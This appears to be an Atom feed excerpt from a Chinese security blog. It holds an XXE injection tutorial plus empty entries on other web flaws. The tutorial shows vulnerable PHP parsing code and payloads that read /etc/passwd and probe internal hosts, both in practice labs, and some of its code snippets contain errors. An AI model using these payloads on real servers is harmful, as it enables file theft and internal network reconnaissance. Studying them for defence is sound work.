    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/XXE%E5%86%85%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/XXE%E5%86%85%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T12:27:17.405Z</published>
    <updated>2023-05-18T14:15:53.188Z</updated>
    
    <content type="html"><![CDATA[<p><strong>XXE外部实体注入</strong></p><span id="more"></span><h2 id="一、何谓XXE"><a href="#一、何谓XXE" class="headerlink" title="一、何谓XXE"></a>一、何谓XXE</h2><p>XXE（XML External Entity Injection）也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，XML文件的解析依赖libxml库，而libxml2.9以前的版本默认支持并开启了对外部实体的引用，服务器端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理，并且实体的URL支持file:&#x2F;&#x2F;和ftp:&#x2F;&#x2F;等协议，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</p><br><h2 id="二、XML文档结构"><a href="#二、XML文档结构" class="headerlink" title="二、XML文档结构"></a>二、XML文档结构</h2><p><strong>1、XML语法规则</strong></p><p>（1）XML文档必须有一个根元素</p><p>（2）XML元素都必须有一个关闭标签</p><p>（3）XML标签对大小写敏感</p><p>（4）XML元素必须被正确的嵌套</p><p>（5）XML属性值必须加引号</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE -------------------&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>01<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sex</span>&gt;</span>男<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">degree</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">degree</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span>闽南师范大学<span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>02<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sex</span>&gt;</span>男<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>19<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">degree</span>&gt;</span>专科<span class="tag">&lt;/<span class="name">degree</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span>漳州职业技术学院<span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2、DTD（document type definition）</strong></p><p>XML文档结构包括XML声明、DTD文档类型定义、文档元素。而DTD就是用来控制文档的一个格式规范的。</p><p>PCDATA 的意思就是被解析的字符数据，PODATA 是会被解析器解析的文本</p><p><strong>3、内部实体引用</strong></p><p>其实除了在DTD中定义元素以外，我们还可以咋子DTD中定义实体（相当于一个变量），我们可以在XML中通过“&amp;”符号进行引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8819-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span>&gt;</span>         # 定义元素为ANY表示接受任何元素</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">xxe</span> <span class="string">&quot;test&quot;</span>&gt;</span>       # 定义一个实体xxe，值为test字符</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>在XML元素中进行内部实体引，进而实现变量替换</p><p><strong>4、外部实体引用</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateprofile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">updateprofile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filename</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">filename</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">updateprofile</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>5、外部引用</strong></p><p>格式：<!DOCTYPE 根元素 SYSTEM "文件名"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 如下DTD定义引用自外部文件 note.dtd</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;node.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>zhangsan<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>cn<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br><span class="line"># 外部文件 node.dtd 的内容为：</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p><strong>1、准备PHP代码</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$xml = file_get_contents(&quot;php://input&quot;);    // 直接使用伪协议读取POST请求的全部内容</span><br><span class="line">$data = simplexml_load_string($xml,&#x27;SimpleXMLElement&#x27;,LIBXML_NOENT);    //此过程会对XML进行解析</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure><p><strong>2、在浏览器中发送POST请求</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ] &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述PHP代码中，并没有使用$_POST[‘arg’]去获取请求的内容，而是使用PHP伪协议 php:&#x2F;&#x2F;input，所以不需要指定参数名如果使用$_POST[‘arg’]去读取前端的XML内容，也是没有问题的指定arg&#x3D;xml即可，但是需要将xml内容进行URL转码</p><p><strong>3、试试端口扫描</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.254.134&quot;</span>&gt;</span> ] &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">node</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">node</span>&gt;</span></span><br></pre></td></tr></table></figure><p>既然可以端口扫描，当然也可以实现内网扫描、资产探测、DOS攻击等操作</p><br><h2 id="四、靶场环境下的XXE"><a href="#四、靶场环境下的XXE" class="headerlink" title="四、靶场环境下的XXE"></a>四、靶场环境下的XXE</h2><h3 id="1、pikachu"><a href="#1、pikachu" class="headerlink" title="1、pikachu"></a>1、pikachu</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version-=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、dorabox"><a href="#2、dorabox" class="headerlink" title="2、dorabox"></a>2、dorabox</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Mikasa</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">hellworld</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;hellword;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;XXE外部实体注入&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-05-12T12:26:39.967Z</published>
    <updated>2023-05-12T12:26:39.967Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2023-05-12T12:26:08.997Z</published>
    <updated>2023-05-12T12:26:08.997Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2023-05-12T12:25:55.301Z</published>
    <updated>2023-05-12T12:25:55.301Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2023-05-12T12:25:34.504Z</published>
    <updated>2023-05-12T12:25:34.504Z</updated>
    
    
    
    
    
  </entry>
  
</feed>
